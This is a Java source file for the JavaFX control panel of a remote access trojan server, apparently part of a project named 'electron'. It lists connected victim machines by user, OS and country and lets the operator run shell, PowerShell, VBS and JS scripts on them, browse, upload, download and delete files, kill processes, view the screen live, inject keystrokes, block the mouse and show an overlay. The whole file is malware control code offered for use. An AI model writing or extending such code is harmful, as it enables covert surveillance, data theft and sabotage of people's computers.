package electron.gui;

import java.awt.Toolkit;
import java.awt.datatransfer.Clipboard;
import java.awt.datatransfer.StringSelection;
import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;
import java.util.Optional;
import electron.RAT_server;
import electron.actions.Explorer;
import electron.actions.Misc;
import electron.actions.Scripting;
import electron.actions.Taskmgr;
import electron.networking.NetData;
import electron.networking.ScreenV2Receiver;
import electron.networking.SocketHandler;
import electron.networking.packets.ClientInfo;
import electron.networking.packets.ProcessPacket;
import electron.networking.packets.ExplorerPacketInput;
import electron.networking.packets.OutputPacket;
import electron.utils.Utils;
import electron.utils.logger;
import javafx.application.Platform;
import javafx.beans.property.SimpleStringProperty;
import javafx.collections.FXCollections;
import javafx.collections.ObservableList;
import javafx.embed.swing.SwingFXUtils;
import javafx.event.EventHandler;
import javafx.fxml.FXML;
import javafx.scene.control.*;
import javafx.scene.control.Alert.AlertType;
import javafx.scene.image.ImageView;
import javafx.scene.image.WritableImage;
import javafx.scene.input.KeyCode;
import javafx.scene.input.KeyEvent;
import javafx.scene.input.MouseButton;
import javafx.scene.layout.AnchorPane;
import javafx.scene.text.Text;
import javafx.stage.FileChooser;

public class MainWindowControls {
	public static SocketHandler handler;
	private static int lastConsoleSize = 0;
	private String lastTaskmgrTime = "1";

	@FXML
	private TabPane connections_tabpane;
	@FXML
	private Tab tab_screenv2;
	@FXML
	private Tab tab_taskmgr;
	@FXML
	private Tab tab_scripts;
	@FXML
	private AnchorPane screen_pane;
	@FXML
	private TableView<ClientInfo> connections_table;
	@FXML
	private Text connections_connectedpcs;
	@FXML
	private TableColumn<ClientInfo, String> connections_table_addresscolumn;
	@FXML
	private TableColumn<ClientInfo, String> connections_table_usercolumn;
	@FXML
	private TableColumn<ClientInfo, String> connections_table_oscolumn;
	@FXML
	private TableColumn<ClientInfo, String> connections_table_countrycolumn;
	@FXML
	private TableColumn<ClientInfo, String> connections_table_nativeimagecolumn;
	@FXML
	private Text tasks_time;
	@FXML
	private TableView<ProcessPacket> tasks_table;
	@FXML
	private TableColumn<ProcessPacket, String> tasks_pid;
	@FXML
	private TableColumn<ProcessPacket, String> tasks_name;
	@FXML
	private TableColumn<ProcessPacket, String> tasks_user;
	@FXML
	private TableColumn<ProcessPacket, String> tasks_state;
	@FXML
	private TableColumn<ProcessPacket, String> tasks_memory;
	@FXML
	private TableColumn<ProcessPacket, String> tasks_cpu;
	@FXML
	private TableColumn<ProcessPacket, String> tasks_session;
	@FXML
	private TableColumn<ProcessPacket, String> tasks_title;
	@FXML
	private CheckBox tasks_freeze;
	@FXML
	private CheckBox tasks_fastmode;
	@FXML
	private TextField explorer_path;
	@FXML
	private ListView<String> explorer_list;
	@FXML
	private TextArea console_consoleview;
	@FXML
	private TextField console_commandfield;
	@FXML
	private Button console_sendbtn;
	@FXML
	private CheckBox console_scrolling;
	@FXML
	private CheckBox console_freeze;
	@FXML
	private MenuItem explorer_playfunction;
	@FXML
	private MenuItem explorer_runlistenerfunction;
	@FXML
	private MenuItem explorer_editfunction;
	@FXML
	private ImageView screen_image;
	@FXML
	private CheckBox screen_mode;
	@FXML
	private TextField screen_keyfield;
	@FXML
	private ImageView screenv2_image;
	@FXML
	private TextArea script_code;
	@FXML
	private ChoiceBox<String> script_executor;
	@FXML
	private TextField settings_uitimeupdater;
	@FXML
	private CheckBox settings_screenv2;
	@FXML
	private CheckBox settings_contextmenurexplorer;

	@FXML
	private void initialize() {
		// Configuring graphics components
		console_commandfield.setOnKeyPressed(new EventHandler<KeyEvent>() {
			@Override
			public void handle(KeyEvent ke) {
				if (ke.getCode().equals(KeyCode.ENTER)) {
					sendCommand();
				}
			}
		});
		ObservableList<String> executorsChoices = FXCollections.observableArrayList("cmd", "bat", "ps1", "psconsole",
				"vbs", "js");
		script_executor.setItems(executorsChoices);
		script_executor.getSelectionModel().select(0);
		// Styling some components
		console_consoleview.setStyle(
				"-fx-control-inner-background:#000000; -fx-font-family: Consolas; -fx-highlight-fill: #00ff00; -fx-highlight-text-fill: #000000; -fx-text-fill: #00ff00; ");
		String taskmgrstyle = getClass().getResource("/resources/taskmgr.css").toExternalForm();
		tasks_table.getStylesheets().add(taskmgrstyle);
		tasks_fastmode.setSelected(true);
		explorer_path.setOnKeyPressed(new EventHandler<KeyEvent>() {
			@Override
			public void handle(KeyEvent ke) {
				if (ke.getCode().equals(KeyCode.ENTER)) {
					sendExplorer();
				}
			}
		});
		explorer_list.setOnMouseClicked(event -> {
			if (event.getButton() == MouseButton.PRIMARY && event.getClickCount() == 2) {
				explorer_openAction();
			}
		});
		Runnable updateRunnable = new Runnable() {
			@SuppressWarnings("static-access")
			@Override
			public void run() {
				while (true) {
					Platform.runLater(() -> {
						viewChaged();
						tab_screenv2.setDisable(!settings_screenv2.isSelected());
					});
					try {
						Thread.currentThread().sleep(Integer.parseInt(settings_uitimeupdater.getText()));
					} catch (NumberFormatException | InterruptedException e) {
						logger.error("[UI_UPDATE_TASK]: can't update! Message: " + e.getMessage());
						Platform.runLater(() -> {
							Alert erralert = new Alert(AlertType.ERROR);
							erralert.setHeaderText("UI error");
							erralert.setTitle("Critical error");
							erralert.setContentText("Can't update UI! Message: " + e.getMessage()
									+ "\n Try to change value in TextField.");
							erralert.showAndWait();
						});
					}
				}
			}
		};
		new Thread(updateRunnable).start();
	}

	public void updateClients() {
		if (NetData.getClients().isEmpty()) {
			connections_table.setItems(FXCollections.observableArrayList());
			handler = null;
			connections_connectedpcs.setText("Total connected: 0 PCs");
			return;
		}
		// Getting information for all clients
		ObservableList<ClientInfo> info = FXCollections.observableArrayList();
		for (SocketHandler client : NetData.getClients()) {
			if (client.getInfo() != null) {
				info.add(client.getInfo());
			}
		}
		if (info.isEmpty()) {
			connections_connectedpcs.setText("Total connected: 0 PCs");
			return;
		}
		// Updating table
		connections_table_addresscolumn.setCellValueFactory(cellData -> {
			SimpleStringProperty addressProperty = cellData.getValue().AddressProperty();
			return addressProperty != null ? addressProperty : new SimpleStringProperty("");
		});
		connections_table_usercolumn.setCellValueFactory(cellData -> {
			SimpleStringProperty addressProperty = cellData.getValue().UsernameProperty();
			return addressProperty != null ? addressProperty : new SimpleStringProperty("");
		});
		connections_table_oscolumn.setCellValueFactory(cellData -> {
			SimpleStringProperty addressProperty = cellData.getValue().OsProperty();
			return addressProperty != null ? addressProperty : new SimpleStringProperty("");
		});
		connections_table_countrycolumn.setCellValueFactory(cellData -> {
			SimpleStringProperty addressProperty = cellData.getValue().CountryProperty();
			return addressProperty != null ? addressProperty : new SimpleStringProperty("");
		});
		connections_table_nativeimagecolumn.setCellValueFactory(cellData -> {
			SimpleStringProperty addressProperty = cellData.getValue().NativeImageProperty();
			return addressProperty != null ? addressProperty : new SimpleStringProperty("");
		});
		connections_table.setItems(info);
		// Updating total PCs:
		connections_connectedpcs.setText("Total connected: " + info.size() + " PCs");
	}

	public SocketHandler getHandler(ClientInfo info) {
		for (SocketHandler handler : NetData.getClients()) {
			if (handler.getInfo() == info) {
				return handler;
			}
		}
		return null;
	}

	/**
	 * It sets active socket
	 */
	@FXML
	private void setActiveSocket() {
		handler = getHandler(connections_table.getSelectionModel().getSelectedItem());
		if (handler == null) {
			return;
		}
		// logger.log("[electron.user.MainWindowControls.setActiveSocket]: set socket
		// to: " + handler.getName());
	}

	/**
	 * View change
	 */
	private void viewChaged() {
		String tabName = connections_tabpane.getSelectionModel().getSelectedItem().getText();
		try {
			if (handler != null) {
				// If selected OS does not support some functions - hiding them
				tab_taskmgr.setDisable(!handler.isWindows());
				tab_scripts.setDisable(!handler.isWindows());
			} else {
				tab_taskmgr.setDisable(false);
				tab_scripts.setDisable(false);
			}
		} catch (java.lang.NullPointerException e) {
			logger.warn("[Graphics]: error updating visible components. Message: " + e.getMessage());
		}
		if (tabName.equals("Console")) {
			updateConsoleTab();
		} else if (tabName.equals("Connections")) {
			updateClients();
		} else if (tabName.equals("Explorer")) {
			updateExplorer();
		} else if (tabName.equals("Screen")) {
			updateScreen();
		} else if (tabName.equals("ScreenV2")) {
			updateScreenV2();
		} else if (tabName.equals("Tasks")) {
			updateTasks();
		} else {
			return;
		}
	}

	/*
	 * Script Tab Controls
	 */
	@FXML
	private void script_executeAction() {
		if (handler == null) {
			Utils.showErrorMessage("Incorrect action", "You must select client first!",
					"Select client in 'Connections' pane firstly.");
			return;
		}
		String script = script_code.getText();
		String type = script_executor.getSelectionModel().getSelectedItem();
		Scripting.executeScript(handler, script, type);
	}

	@FXML
	private void script_importAction() {
		FileChooser fileChooser = new FileChooser();
		fileChooser.setTitle("Import code from file");
		fileChooser.getExtensionFilters().addAll(new FileChooser.ExtensionFilter("All Text Files", "*.*"),
				new FileChooser.ExtensionFilter("CMD Script", "*.cmd"),
				new FileChooser.ExtensionFilter("BAT Script", "*.bat"),
				new FileChooser.ExtensionFilter("PS Script", "*.ps1"),
				new FileChooser.ExtensionFilter("JS Script", "*.js"),
				new FileChooser.ExtensionFilter("VBS Script", "*.vbs"));
		fileChooser.setInitialDirectory(new File("scripts"));
		File file = fileChooser.showOpenDialog(RAT_server.getInitialStage());
		if (file != null) {
			logger.log("[electron.gui.MainWindowControls.script_importAction]: importing: " + file.getAbsolutePath());
			String result = Utils.getFileLineWithSeparator(Utils.getFileLines(file.getAbsolutePath()), "\n");
			script_code.setText(result);
		}
	}

	/*
	 * Task Manager Tab Controls
	 */
	private void updateTasks() {
		if (handler == null) {
			tasks_table.setItems(FXCollections.observableArrayList());
			return;
		}
		tasks_time.setText(handler.getLastTaskmgrDate());
		Taskmgr.requestData(handler, tasks_fastmode.isSelected());
		if (handler.getTaskList() == null) {
			return;
		}
		// Getting information for all processes
		ObservableList<ProcessPacket> procs = FXCollections.observableArrayList();
		procs.addAll(handler.getTaskList());
		if (procs.isEmpty()) {
			return;
		}
		// Showing data
		tasks_pid.setCellValueFactory(cellData -> {
			SimpleStringProperty pid = cellData.getValue().getPid();
			return pid != null ? pid : new SimpleStringProperty("-");
		});
		tasks_name.setCellValueFactory(cellData -> {
			SimpleStringProperty pid = cellData.getValue().getName();
			return pid != null ? pid : new SimpleStringProperty("-");
		});
		tasks_user.setCellValueFactory(cellData -> {
			SimpleStringProperty pid = cellData.getValue().getUser();
			return pid != null ? pid : new SimpleStringProperty("-");
		});
		tasks_state.setCellValueFactory(cellData -> {
			SimpleStringProperty pid = cellData.getValue().getState();
			return pid != null ? pid : new SimpleStringProperty("-");
		});
		tasks_memory.setCellValueFactory(cellData -> {
			SimpleStringProperty pid = cellData.getValue().getMemory();
			return pid != null ? pid : new SimpleStringProperty("-");
		});
		tasks_cpu.setCellValueFactory(cellData -> {
			SimpleStringProperty pid = cellData.getValue().getCpu_time();
			return pid != null ? pid : new SimpleStringProperty("-");
		});
		tasks_session.setCellValueFactory(cellData -> {
			SimpleStringProperty pid = cellData.getValue().getSession();
			return pid != null ? pid : new SimpleStringProperty("-");
		});
		tasks_title.setCellValueFactory(cellData -> {
			SimpleStringProperty pid = cellData.getValue().getTitle();
			return pid != null ? pid : new SimpleStringProperty("-");
		});
		if (handler.getLastTaskmgrDate().equals(lastTaskmgrTime) || tasks_freeze.isSelected()) {
			return;
		}
		tasks_table.setItems(procs);
		lastTaskmgrTime = handler.getLastTaskmgrDate();
	}

	@FXML
	private void tasks_killAction() {
		if (handler == null) {
			return;
		}
		ProcessPacket packet = tasks_table.getSelectionModel().getSelectedItem();
		Taskmgr.killProcess_PID(packet, handler);
	}

	@FXML
	private void tasks_killNameAction() {
		if (handler == null) {
			return;
		}
		ProcessPacket packet = tasks_table.getSelectionModel().getSelectedItem();
		Taskmgr.killProcess_NAME(packet, handler);
	}

	@FXML
	private void tasks_copyProcInfo() {
		ProcessPacket packet = tasks_table.getSelectionModel().getSelectedItem();
		StringSelection stringSelection = new StringSelection(
				packet.getPid().getValue() + " | " + packet.getName().getValue() + " | " + packet.getUser().getValue()
						+ " | " + packet.getSession().getValue() + " | " + packet.getTitle().getValue());
		Clipboard clipboard = Toolkit.getDefaultToolkit().getSystemClipboard();
		clipboard.setContents(stringSelection, null);
		Utils.showMessage("Success", "Success", "Copied text to chipboard.");
	}

	/*
	 * Screen Tab Controls
	 */
	private void updateScreen() {
		if (handler == null || handler.getScreen() == null) {
			return;
		}
		// Resize system
		screen_image.setPreserveRatio(screen_mode.isSelected());
		screen_image.setFitWidth(screen_pane.getWidth());
		screen_image.setFitHeight(screen_pane.getHeight());
		WritableImage img = SwingFXUtils.toFXImage(handler.getScreen(), null);
		screen_image.setImage(img);
	}

	@FXML
	private void freezeScreen() {
		FreezeScreenImage.paint(MainWindowControls.handler.getScreen());
	}

	@FXML
	private void screen_overlayAction() {
		Misc.toggle_overlay(handler);
	}

	@FXML
	private void screen_blockMouseAction() {
		Misc.toggle_blockmouse(handler);
	}

	@FXML
	private void screen_sendkeysAction() {
		if (handler == null) {
			Utils.showErrorMessage("Incorrect action", "You must select client first!",
					"Select client in 'Connections' pane firstly.");
			return;
		}
		String keys = screen_keyfield.getText();
		Misc.presskeys(handler, keys);
	}

	@FXML
	private void toggleScreen() {
		if (handler == null) {
			Utils.showErrorMessage("Incorrect action", "You must select client first!",
					"Select client in 'Connections' pane firstly.");
			return;
		}
		Misc.toggle_screen(handler);
	}

	@FXML
	private void settings_createParentScreen() throws IOException {
		ScreenViewControls.create();
	}

	@FXML
	private void settings_launchPlayerGui() {
		OutputPacket.sendOutPacket("/player soundpacket", handler);
	}

	/*
	 * ScreenV2 Tab Controls
	 */
	private void updateScreenV2() {
		if (handler == null || ScreenV2Receiver.getImage() == null) {
			return;
		}
		WritableImage img = SwingFXUtils.toFXImage(ScreenV2Receiver.getImage(), null);
		screenv2_image.setImage(img);
	}

	@FXML
	private void freezeScreenV2() {
		FreezeScreenImage.paint(ScreenV2Receiver.getImage());
	}

	@FXML
	private void toggleScreenV2() {
		if (handler == null) {
			Utils.showErrorMessage("Incorrect action", "You must select client first!",
					"Select client in 'Connections' pane firstly.");
			return;
		}
		Misc.toggle_screenV2(handler);
	}

	/*
	 * Explorer Tab Controls
	 */
	private void updateExplorer() {
		if (handler == null || handler.getInfo() == null) {
			explorer_path.setText("");
			return;
		}
		if (handler.isWindows()) {
			// If OS is Windows
			if (explorer_path.getText().isEmpty()) {
				// If path is empty
				explorer_path.setText("C:\\");
				sendExplorer();
			}
		} else {
			// If OS is Linux
			if (explorer_path.getText().isEmpty()) {
				// If path is empty
				explorer_path.setText("/");
				sendExplorer();
			}
		}
		// parsing data
		ExplorerPacketInput inpacket = handler.getExplorerInfo();
		if (inpacket == null) {
			return;
		}
		if (inpacket.getFiles().isEmpty()) {
			explorer_list.setItems(FXCollections.observableArrayList());
			return;
		}
		ObservableList<String> info = FXCollections.observableArrayList();
		for (Object item : inpacket.getFiles()) {
			info.add(String.valueOf(item));
		}
		explorer_list.setItems(info);
	}

	@FXML
	private void explorer_runAction() {
		if (handler == null) {
			Utils.showErrorMessage("Incorrect action", "You must select client first!",
					"Select client in 'Connections' pane firstly.");
			return;
		}
		if (explorer_list.getSelectionModel().getSelectedItem().isEmpty()) {
			Utils.showMessage("Incorrect action", "You must select file to open", "You must select file to open");
		} else {
			String f = explorer_list.getSelectionModel().getSelectedItem();
			Explorer.runFile(handler, explorer_path.getText(), f);
		}
	}

	@FXML
	private void explorer_runListenerAction() {
		if (handler == null) {
			Utils.showErrorMessage("Incorrect action", "You must select client first!",
					"Select client in 'Connections' pane firstly.");
			return;
		}
		if (explorer_list.getSelectionModel().getSelectedItem().isEmpty()) {
			Utils.showErrorMessage("Incorrect action", "You must select file to open", "You must select file to open");
		} else {
			String f = explorer_list.getSelectionModel().getSelectedItem();
			Explorer.runListener(handler, explorer_path.getText(), f);
		}
	}

	@FXML
	private void explorer_openAction() {
		if (explorer_list.getSelectionModel().getSelectedItem().isEmpty()) {
			Utils.showErrorMessage("Incorrect action", "You must select file to open", "You must select file to open");
		} else {
			explorer_path.setText(
					Explorer.openPath(explorer_path.getText(), explorer_list.getSelectionModel().getSelectedItem()));
			sendExplorer();
		}
	}

	@FXML
	private void explorer_backAction() {
		String path = explorer_path.getText();
		if (handler == null) {
			Utils.showErrorMessage("Incorrect action", "You must select client first!",
					"Select client in 'Connections' pane firstly.");
			return;
		}
		if (System.getProperty("os.name").toLowerCase().contains("windows") == handler.isWindows()) {
			path = Explorer.getParentNative(path);
		} else {
			path = Explorer.getParent(handler, path);
		}
		explorer_path.setText(path);
		sendExplorer();
	}

	@FXML
	private void explorer_createAction() {
		if (handler == null) {
			Utils.showErrorMessage("Incorrect action", "You must select client first!",
					"Select client in 'Connections' pane firstly.");
			return;
		}
		TextInputDialog td = new TextInputDialog();
		td.setTitle("Create file");
		td.setContentText("Enter file to create:");
		Optional<String> a = td.showAndWait();
		String fname = a.get();
		logger.log("[electron.gui.MainWindowControls.explorer_createAction] creating file: " + fname);
		Explorer.createFile(handler, explorer_path.getText(), fname);
	}

	@FXML
	private void explorer_deleteAction() {
		if (handler == null) {
			Utils.showErrorMessage("Incorrect action", "You must select client first!",
					"Select client in 'Connections' pane firstly.");
			return;
		}
		if (explorer_list.getSelectionModel().getSelectedItem().isEmpty()) {
			Utils.showErrorMessage("Incorrect action", "You must select file!", "Select file you want to delete");
		} else {
			Explorer.deleteFile(handler, explorer_path.getText(), explorer_list.getSelectionModel().getSelectedItem());
		}
	}

	@FXML
	private void explorer_editAction() {
		if (handler == null) {
			Utils.showErrorMessage("Incorrect action", "You must select client first!",
					"Select client in 'Connections' pane firstly.");
			return;
		}
		String result = explorer_path.getText();
		if (explorer_list.getSelectionModel().getSelectedItem().isEmpty()) {
			Utils.showErrorMessage("Incorrect action", "You must select file to edit!",
					"You must select file to edit!");
		} else {
			if (result.endsWith("/") || result.endsWith("\\")) {
				result = result + explorer_list.getSelectionModel().getSelectedItem();
			} else {
				result = result + "/" + explorer_list.getSelectionModel().getSelectedItem();
			}
			OutputPacket.sendOutPacket("/edit=" + result, handler);
		}
	}

	@FXML
	private synchronized void explorer_contextOpened() {
		if (handler == null) {
			return;
		}
		if (settings_contextmenurexplorer.isSelected()) {
			// If bypassing enabled
			explorer_playfunction.setVisible(true);
			explorer_runlistenerfunction.setVisible(true);
			explorer_editfunction.setVisible(true);
			return;
		}
		if (explorer_list.getSelectionModel().getSelectedItem() != null
				&& !explorer_list.getSelectionModel().getSelectedItem().isEmpty()) {
			explorer_playfunction.setVisible(explorer_list.getSelectionModel().getSelectedItem().endsWith(".wav"));
			explorer_runlistenerfunction.setVisible(handler.isWindows());
			explorer_editfunction.setVisible(explorer_list.getSelectionModel().getSelectedItem().contains("."));
		}
	}

	@FXML
	private void explorer_play() {
		if (handler == null) {
			Utils.showErrorMessage("Incorrect action", "You must select client first!",
					"Select client in 'Connections' pane firstly.");
			return;
		}
		Explorer.play(handler, explorer_path.getText(), explorer_list.getSelectionModel().getSelectedItem());
	}

	@FXML
	private void explorer_upload() {
		if (handler == null) {
			Utils.showErrorMessage("Incorrect action", "You must select client first!",
					"Select client in 'Connections' pane firstly.");
			return;
		}
		// Selecting file to send
		FileChooser fileChooser = new FileChooser();
		fileChooser.setTitle("Open File");
		File file = fileChooser.showOpenDialog(RAT_server.getInitialStage());
		if (file != null) {
			Explorer.lauch_uploader(handler, explorer_path.getText(), file);
		}
	}

	@FXML
	private void explorer_download() {
		if (handler == null) {
			Utils.showErrorMessage("Incorrect action", "You must select client first!",
					"Select client in 'Connections' pane firstly.");
			return;
		}
		if (explorer_list.getSelectionModel().getSelectedItem().isEmpty()) {
			Alert al = new Alert(AlertType.ERROR);
			al.setTitle("Incorrect action");
			al.setContentText("You must select file to download.");
			al.show();
		} else {
			Explorer.lauch_downloader(handler, explorer_path.getText(),
					explorer_list.getSelectionModel().getSelectedItem());
		}
	}

	@FXML
	private void sendExplorer() {
		if (handler == null) {
			return;
		}
		Explorer.updateExplorer(handler, explorer_path.getText());
	}

	/*
	 * Console Tab Controls
	 */
	private void updateConsoleTab() {
		if (console_scrolling.isSelected()) {
			console_consoleview.setScrollTop(Double.MAX_VALUE);
		}
		if (handler == null) {
			console_consoleview.setText("Select client to work with, please.");
			return;
		}
		if (console_freeze.isSelected()) {
			return;
		}
		String result = "";
		if (handler.getMessages() == null || handler.getMessages().size() == lastConsoleSize) {
			return;
		} else {
			lastConsoleSize = handler.getMessages().size();
		}
		// ConcurrentModifictionException fix
		List<String> msgs = Collections.synchronizedList(new ArrayList<>());
		msgs.addAll(handler.getMessages());
		for (String message : msgs) {
			result = result + message + "\n";
		}
		msgs = null;
		console_consoleview.setText(result);
	}

	@FXML
	private void console_clearAction() {
		if (handler == null) {
			return;
		}
		console_consoleview.clear();
		handler.clearLog();
	}

	@FXML
	private void sendCommand() {
		if (handler == null) {
			Utils.showErrorMessage("Incorrect action", "You must select client first!",
					"Select client in 'Connections' pane firstly.");
			return;
		}
		String command = console_commandfield.getText();
		// Creating packet to send
		OutputPacket.sendOutPacket(command, handler);
		handler.addMessageToLog("[SERVER]: sending: " + console_commandfield.getText());
		console_commandfield.setText("");
	}
}
